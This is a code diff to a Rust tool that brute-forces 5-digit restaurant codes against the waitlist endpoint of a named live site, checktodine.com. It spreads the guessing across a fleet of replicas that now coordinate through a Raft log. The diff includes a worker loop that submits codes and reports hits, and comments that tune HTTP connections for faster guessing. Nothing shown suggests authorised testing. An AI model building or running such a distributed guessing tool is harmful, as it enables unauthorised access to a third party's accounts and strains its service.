@@ -1,16 +1,13 @@
-//! Brute-forces 5-digit restaurant codes against checktodine.com's waitlist endpoint, over every replica of the app
-//! at once.
-//!   - The replicas are one: each keeps a WebSocket to every other (mesh.rs), and they agree on the one scan that runs,
-//!     hand its codes out, share its progress, and stop together (coord.rs). Start or stop from any replica's page.
-//!   - A scan covers from..to (half-open, within 00000..99999; to may be 100000), in a random order: shuffled, cut
-//!     into chunks, every replica given some at once.
-//!   - Each replica tries its codes at RATE_PER_SEC through a token bucket, 10 retries with exponential backoff per
-//!     code; a body without "Restaurant Code is not valid." is a hit, and every replica stops.
-//!   - GET / serves the page; GET /orchestrate/status the scan as every replica knows it; GET /status this replica's
-//!     own counters.
+//! Brute-forces 5-digit restaurant codes against checktodine.com's waitlist endpoint, over every replica at once.
+//!
+//! Shared state (the scan, which chunks are done, what was found) is a minimal Raft log (raft.rs): a leader is
+//! elected, entries commit on a majority, and a restarted replica catches up by snapshot. Anyone can start a scan
+//! (at most one runs) or stop it, from any replica: the request goes to the leader. The work plane (chunk hand-outs,
+//! trying codes, telemetry) stays outside the log in coord.rs; replicas mesh over WebSockets in mesh.rs.
 
 mod coord;
 mod mesh;
+mod raft;
 
 use axum::extract::{rejection::QueryRejection, Query, State};
 use axum::http::StatusCode;
@@ -18,7 +15,6 @@ use axum::response::{Html, IntoResponse, Json};
 use axum::routing::get;
 use axum::Router;
 use coord::Node;
-use futures::stream::{self, StreamExt};
 use reqwest::Client;
 use serde::Deserialize;
 use serde_json::json;
@@ -44,7 +40,7 @@ const INVALID_MARKER: &str = "Restaurant Code is not valid.";
 /// Exclusive upper bound for `to`: 100000 means "up to and including 99999".
 const MAX_TO: u32 = 100_000;
 
-/// Number of replicas in the fleet: REPLICA_COUNT (default 50). A majority of it must grant a scan.
+/// Number of replicas in the fleet: REPLICA_COUNT (default 50). Fixed membership for the Raft quorum.
 fn replica_count() -> u32 {
     std::env::var("REPLICA_COUNT").ok().and_then(|v| v.parse().ok()).unwrap_or(50)
 }
@@ -264,7 +260,8 @@ struct StartParams {
     to: Option<u32>,
 }
 
-/// GET /start, /orchestrate/start?from=&to= — proposes the scan to every replica; it runs once a majority grants it.
+/// GET /start, /orchestrate/start?from=&to= — from ANY replica: the request goes to the Raft leader, which logs
+/// the scan once a majority commits it. At most one scan runs at a time.
 async fn start_handler(State(node): State<Arc<Node>>, query: Result<Query<StartParams>, QueryRejection>) -> impl IntoResponse {
     let params = match query {
         Ok(Query(p)) => p,
@@ -272,63 +269,56 @@ async fn start_handler(State(node): State<Arc<Node>>, query: Result<Query<StartP
     };
     let from = params.from.unwrap_or(0);
     let to = params.to.unwrap_or(MAX_TO);
-    if from >= to || to > MAX_TO {
-        return (StatusCode::BAD_REQUEST,
-            Json(json!({"ok": false, "error": "bad range: need 0 <= from < to <= 100000 (from inclusive, to exclusive)"})));
-    }
-    match node.start(from, to).await {
-        Ok(message) => (StatusCode::OK, Json(json!({"ok": true, "message": message}))),
-        Err(error) => (StatusCode::CONFLICT, Json(json!({"ok": false, "error": error}))),
+    match node.client_start(from, to).await {
+        (true, message) => (StatusCode::OK, Json(json!({"ok": true, "message": message}))),
+        (false, error) => (StatusCode::CONFLICT, Json(json!({"ok": false, "error": error}))),
     }
 }
 
-/// GET /stop, /orchestrate/stop — stops the scan on every replica, from any replica: over the mesh, and to every
-/// replica's /stop?local=1 too (one whose connections are down still hears it). ?local=1: this replica only.
+/// GET /stop, /orchestrate/stop — from ANY replica: the stop is committed to the Raft log, so every replica stops.
+/// ?local=1: don't fan out over plain HTTP (used by the fan-out itself).
 async fn stop_handler(State(node): State<Arc<Node>>, Query(q): Query<HashMap<String, String>>) -> impl IntoResponse {
     let local = q.get("local").map(|v| v == "1").unwrap_or(false);
-    node.note_stop(None, node.me, !local);
-    if !local {
-        let client = node.client.clone();
-        let n = node.n;
-        let me = node.me;
-        tokio::spawn(async move {
-            stream::iter((1..=n).filter(|k| *k != me))
-                .for_each_concurrent(20, |k| {
-                    let c = client.clone();
-                    async move {
-                        let _ = c.get(format!("{}/stop?local=1", replica_url(k))).timeout(Duration::from_secs(5)).send().await;
-                    }
-                })
-                .await;
-        });
-    }
-    Json(json!({"ok": true, "message": if local { "stopped here" } else { "stop sent to every replica" }}))
+    let (ok, message) = node.client_stop(!local).await;
+    let status = if ok { StatusCode::OK } else { StatusCode::CONFLICT };
+    (status, Json(json!({"ok": ok, "message": message})))
 }
 
 /// GET /status — this replica's own work.
 async fn status_handler(State(node): State<Arc<Node>>) -> impl IntoResponse {
-    let c = &node.w.c;
-    let (range, total, orchestrating) = {
-        let core = node.core.lock().unwrap();
-        match &core.scan {
-            Some(s) => (s.h.range(), (s.h.to - s.h.from) as u64, core.coord.is_some()),
-            None => ("—".to_string(), 0, false),
+    let c = &node.worker.c;
+    let (range, total, tried) = {
+        let sm = node.sm.lock().unwrap();
+        match &sm.scan {
+            Some(s) => {
+                let tried: u64 = s.done.iter().enumerate().filter(|(_, d)| **d).map(|(k, _)| {
+                    let total = (s.to - s.from) as u64;
+                    let start = k as u64 * coord::CHUNK as u64;
+                    total.saturating_sub(start).min(coord::CHUNK as u64)
+                }).sum();
+                (s.range(), (s.to - s.from) as u64, tried)
+            }
+            None => ("—".to_string(), 0, 0),
         }
     };
     let last_error = c.last_error.lock().unwrap().clone();
+    let r = node.raft.lock().unwrap();
+    let (leader, term, role) = (r.leader, r.term, format!("{:?}", r.role).to_lowercase());
+    drop(r);
     Json(json!({
-        "running": node.w.active.load(Ordering::SeqCst), "range": range, "tried": c.tried.load(Ordering::Relaxed), "total": total,
+        "running": node.worker.active.load(Ordering::SeqCst), "range": range, "tried": tried, "total": total,
         "trial_code": c.trial_code.lock().unwrap().clone(), "valid_code": c.valid_code.lock().unwrap().clone(),
         "found": *c.valid_code.lock().unwrap() != "—",
         "ok_200": c.ok_200.load(Ordering::Relaxed), "http_4xx": c.http_4xx.load(Ordering::Relaxed),
         "http_5xx": c.http_5xx.load(Ordering::Relaxed), "timeouts": c.timeouts.load(Ordering::Relaxed),
         "net_errors": c.net_errors.load(Ordering::Relaxed), "last_error": if last_error.is_empty() { "—".to_string() } else { last_error },
-        "buffer_len": node.w.queue.lock().unwrap().len(), "orchestrating": orchestrating, "replica": node.me,
+        "buffer_len": node.worker.queue.lock().unwrap().len(), "replica": node.me,
+        "leader": leader, "term": term, "role": role,
         "connected": node.peers.lock().unwrap().len() + 1,
     }))
 }
 
-/// GET /orchestrate/status — the scan, as every replica knows it.
+/// GET /orchestrate/status — the scan, as the Raft log has it.
 async fn orch_status_handler(State(node): State<Arc<Node>>) -> impl IntoResponse {
     Json(node.status())
 }
@@ -337,13 +327,40 @@ async fn root_handler() -> Html<&'static str> {
     Html(include_str!("index.html"))
 }
 
+/// Drains this replica's queue: every code tried until the site answers it. A hit is reported until the log
+/// carries it (then every replica stops).
+async fn work(node: Arc<Node>) {
+    loop {
+        let item = node.worker.queue.lock().unwrap().pop_front();
+        let Some((sid, chunk, code)) = item else {
+            tokio::time::sleep(Duration::from_millis(100)).await;
+            continue;
+        };
+        let keep = || {
+            node.worker.active.load(Ordering::SeqCst) && *node.worker.scan.lock().unwrap() == sid && node.worker.left.lock().unwrap().contains_key(&chunk)
+        };
+        match submit(&node.client, &node.worker.c, &node.pacer, &code, keep).await {
+            None => {}
+            Some(true) => {
+                node.worker.c.tried.fetch_add(1, Ordering::Relaxed);
+                let id = sid.to_string();
+                node.clone().report_found(id, code).await;
+            }
+            Some(false) => {
+                node.worker.c.tried.fetch_add(1, Ordering::Relaxed);
+                node.tried(&sid, chunk);
+            }
+        }
+    }
+}
+
 #[tokio::main]
 async fn main() {
     let port: u16 = std::env::var("PORT").ok().and_then(|p| p.parse().ok()).unwrap_or(3000);
     let me: u32 = std::env::var("FLEET_REPLICA").ok().and_then(|p| p.parse().ok()).unwrap_or(1);
 
-    // HTTP/1.1 so concurrent requests use distinct sockets (HTTP/2 would multiplex them over one, and the site
-    // handles those ~sequentially), and a big idle pool so the scan never pays a fresh TLS handshake.
+    // HTTP/1.1 so concurrent requests use distinct sockets, and a big idle pool so the scan never pays a fresh
+    // TLS handshake.
     let client = Client::builder()
         .timeout(Duration::from_secs(30))
         .http1_only()
@@ -356,9 +373,12 @@ async fn main() {
     let node = Node::new(me, replica_count(), client, Arc::new(Pacer::new()));
 
     for _ in 0..BUFFER_WORKERS {
-        tokio::spawn(coord::work(node.clone()));
+        tokio::spawn(work(node.clone()));
     }
-    tokio::spawn(node.clone().watch());
+    tokio::spawn(node.clone().raft_tick());
+    tokio::spawn(node.clone().assign_loop());
+    tokio::spawn(node.clone().batch_loop());
+    tokio::spawn(node.clone().prog_loop());
     for j in (me + 1)..=node.n {
         tokio::spawn(mesh::dial(node.clone(), j));
     }
